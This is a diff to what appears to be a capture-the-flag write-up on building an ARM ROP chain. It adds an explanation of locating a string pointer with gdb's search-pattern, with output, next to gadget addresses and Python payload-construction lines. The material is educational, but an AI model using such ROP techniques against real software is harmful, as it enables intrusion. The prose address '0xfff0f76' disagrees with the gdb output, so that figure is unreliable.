@@ -826,6 +826,13 @@ Fist, call `pop {r3, pc}` and fill its `r3` and `pc`.
 Next, call `0x00010628: pop {r4, r5, r6, r7, r8, sb, sl, pc};` and fill in their arguments.
 Finally, call `0x00010610: mov r2, sb; mov r1, r8; mov r0, r7; blx r3;` to move values of registers and call `open` function.
 
+We need a pointer to a string that is linked to `flag` in flag. We can find it using `search-pattern <pattern>` in gdb. I executed `search-pattern 1` and use `0xfff0f76`.
+
+```gdb
+[+] In '[vectors]'(0xffff0000-0xffff1000), permission=r-x
+  0xffff0f76 - 0xffff0f77  →   "1"
+```
+
 ```python
 payload += struct.pack("I", rop3)
 payload += struct.pack("I", open_addr)  # r3
